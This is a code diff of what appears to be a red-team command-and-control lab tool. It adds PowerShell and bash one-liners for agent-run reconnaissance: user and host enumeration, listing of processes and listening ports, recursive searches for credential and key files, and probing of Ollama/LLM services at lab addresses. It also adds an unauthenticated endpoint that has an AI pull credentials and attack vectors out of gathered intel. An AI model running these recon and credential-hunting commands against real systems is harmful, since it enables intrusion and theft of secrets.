@@ -3602,17 +3602,49 @@ _RECON_CATALOG = {
 
 
 def _mock_autorecon_script(step_num: int, language: str, is_last: bool = False):
-    """Return (reasoning, code) for a mock autorecon step (0-indexed step_num).
-    If is_last=True, always returns the Ollama discovery script regardless of step index.
+    """Return (reasoning, code) for a mock autorecon step.
+    Scripts are compact one-liners suited for direct agent execution via ';' chaining.
     """
-    table = {
-        "python":     _MOCK_RECON_PYTHON,
-        "powershell": _MOCK_RECON_POWERSHELL,
-        "bash":       _MOCK_RECON_BASH,
-    }
-    scripts = table.get(language, _MOCK_RECON_BASH)
-    # Last step is always the Ollama discovery (index -1 in each list)
-    idx = len(scripts) - 1 if is_last else min(step_num, len(scripts) - 2)
+    _PS = [
+        (
+            "Enumerate system info, current user, network adapters and probe AI services",
+            r"whoami /all 2>$null; $env:COMPUTERNAME; [System.Environment]::OSVersion.VersionString; Get-NetIPAddress | Select InterfaceAlias,IPAddress | Where {$_.IPAddress -notlike '169.*'} | ft -auto; @('172.30.0.10:8080','172.30.0.11:11434','127.0.0.1:11434') | foreach { try { $s=(iwr http://$_ -TimeoutSec 2 -UseBasicParsing -EA Stop).StatusCode; \"OPEN $_=$s\" } catch { \"CLOSED $_\" } }",
+        ),
+        (
+            "List top processes by CPU and all listening TCP ports",
+            r"Get-Process | Sort-Object CPU -Desc | Select -First 15 Name,Id,CPU | ft -auto; Get-NetTCPConnection -State Listen | Select LocalPort,OwningProcess | Sort LocalPort | ft -auto",
+        ),
+        (
+            "Search for credential and configuration files in common paths",
+            r"Get-ChildItem $env:USERPROFILE,$env:TEMP,'C:\inetpub','C:\wwwroot' -Recurse -Include *.env,*.json,*credential*,*secret*,*.key,*.pem -EA SilentlyContinue | Select FullName,Length | ft -auto",
+        ),
+        (
+            "Discover Ollama / LLM services, list available models and confirm chat endpoint",
+            r"@('172.30.0.11:11434','127.0.0.1:11434') | foreach { try { $r=(iwr http://$_/api/tags -TimeoutSec 3 -UseBasicParsing -EA Stop).Content; Write-Host ('OPEN http://' + $_ + ' => ' + $r) } catch { Write-Host ('CLOSED ' + $_) } }",
+        ),
+    ]
+    _BASH = [
+        (
+            "Enumerate system info, network interfaces and probe AI services",
+            r"id; hostname; uname -a; ip addr 2>/dev/null | grep -E 'inet |^[0-9]'; for t in 172.30.0.10:8080 172.30.0.11:11434 127.0.0.1:11434 127.0.0.1:5001; do curl -sm2 http://$t/health 2>/dev/null && echo OPEN:$t || echo CLOSED:$t; done",
+        ),
+        (
+            "List top processes by CPU and all listening ports",
+            r"ps aux --sort=-%cpu 2>/dev/null | head -15; echo ---; ss -tlnp 2>/dev/null | head -15",
+        ),
+        (
+            "Search for credential and sensitive configuration files",
+            r"find /tmp /home /var/www /etc /opt /root 2>/dev/null \( -name '*.env' -o -name '*credential*' -o -name '*secret*' -o -name '*.key' \) | head -20",
+        ),
+        (
+            "Discover Ollama / LLM services and enumerate available models",
+            r"for c in 172.30.0.11:11434 127.0.0.1:11434; do echo === $c ===; curl -sm3 http://$c/api/tags 2>/dev/null && echo || echo CLOSED; done",
+        ),
+    ]
+    table = {"powershell": _PS, "bash": _BASH, "python": _BASH}
+    scripts = table.get(language, _BASH)
+    # Last step is always the LLM discovery entry (index -1)
+    idx = len(scripts) - 1 if is_last else (step_num % (len(scripts) - 1))
     return scripts[idx]
 
 
@@ -4230,6 +4262,42 @@ def health_check():
     except Exception as e:
         logger.error(f"Health check failed: {str(e)}")
         return jsonify({"status": "unhealthy", "error": str(e)}), 500
+
+
+@app.route("/api/analyze", methods=["POST"])
+def api_analyze():
+    """Analyze intelligence data with AI — no JWT required (C2 dashboard use)."""
+    try:
+        data = request.json or {}
+        intel_text = data.get("intel") or data.get("logs") or ""
+        if not intel_text:
+            return jsonify({"status": "error", "message": "No intel provided"}), 400
+
+        prompt = (
+            "You are a red team analyst. Analyze the following intelligence data. "
+            "Identify: credentials, IP addresses, hostnames, open ports, LLM services, "
+            "and any actionable attack vectors. Be concise and specific.\n\n"
+            f"INTEL:\n{str(intel_text)[:3000]}"
+        )
+
+        if CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config:
+            cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
+            analysis = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)
+        else:
+            # Mock analysis for demo
+            analysis = (
+                "[MOCK ANALYSIS] Intelligence reviewed.\n"
+                "• Credentials detected: check highlighted fields\n"
+                "• Reachable services: probe 172.30.0.11:11434 (Ollama), 172.30.0.10:8080 (victim-lab)\n"
+                "• Recommended next step: run AutoRecon → AI Hunter pipeline\n"
+                "• CrowdStrike AI not configured — connect in Config tab for live analysis"
+            )
+
+        return jsonify({"status": "success", "analysis": analysis})
+    except Exception as e:
+        logger.error(f"API analyze error: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 
 if __name__ == "__main__":
     import argparse
